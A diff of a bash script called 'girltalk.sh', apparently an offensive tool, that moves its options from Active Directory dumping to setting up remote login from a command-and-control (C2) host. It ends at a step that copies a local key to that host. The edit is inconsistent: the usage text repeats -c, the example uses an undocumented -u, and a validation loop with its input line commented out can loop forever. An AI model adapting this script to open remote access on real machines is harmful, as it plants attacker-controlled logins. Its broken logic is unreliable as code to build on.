@@ -21,8 +21,8 @@ Flags:
   -u	C2 username.
   -l    Local username to use.
   -h	Help text and usage example.
-usage:	 girltalk.sh -d <domain> -u <username> -p <password> -c <domain controller> -o <outputFileName.ldif>
-example: girltalk.sh -d GIBSON -u zerocool -p hunter2 -c 10.10.10.257 -o gibsonAD.ldif
+usage:	 girltalk.sh -c <C2 username> -l <local username> -p <password> -c <domain controller> -o <outputFileName.ldif>
+example: girltalk.sh -c host.aws.com -u ubuntu -l hatchetface
 "
 
 # Check if any flags were set. If not, print out help.
@@ -65,19 +65,15 @@ done
 
 # Make sure each required flag was actually set.
 if [ -z ${USERNAME+x} ]; then
-	echo "Username flag (-u) is not set."
+	echo "Remote username (-u) is not set."
 	echo "$USAGE"
 	exit
-elif [ -z ${PASSWORD+x} ]; then
-	echo "Password flag (-p) is not set."
+elif [ -z ${LOCAL+x} ]; then
+	echo "Local username (-l) is not set."
 	echo "$USAGE"
 	exit
-elif [ -z ${DOMAIN+x} ]; then
-	echo "User domain flag (-f) is not set."
-	echo "$USAGE"
-	exit
-elif [ -z ${DCIP+x} ]; then
-	echo "Domain Controller IP flag (-c) is not set."
+elif [ -z ${HOST+x} ]; then
+	echo "Remote C2 hostname (-c) is not set."
 	echo "$USAGE"
 	exit
 fi
@@ -108,21 +104,21 @@ fi
     printf "\n"
 
 #Provide a valid username local to this host for login
-    echo "Please enter your local username"
-    echo ">>> You will use this user's account to log in from your C2! <<<"
-    read user
+#    echo "Please enter your local username"
+#    echo ">>> You will use this user's account to log in from your C2! <<<"
+#    read user
 
 #Error checking for user input
-    until id "$user" >/dev/null; do
+    until id "$USERNAME" >/dev/null; do
         echo "Please enter your local username";
-        read user;
+#        read user;
     done
-    printf "\n"
+#    printf "\n"
 
 #Takes input for what remote host you want to route through
-    echo "Please enter username/IP for desired C2 host (<username>@<C2_host>)"
-    read C2
-    printf "\n"
+#    echo "Please enter username/IP for desired C2 host (<username>@<C2_host>)"
+#    read C2
+#    printf "\n"
 
 #Transfer local key to C2
     echo "### Copying key to C2 host ###"
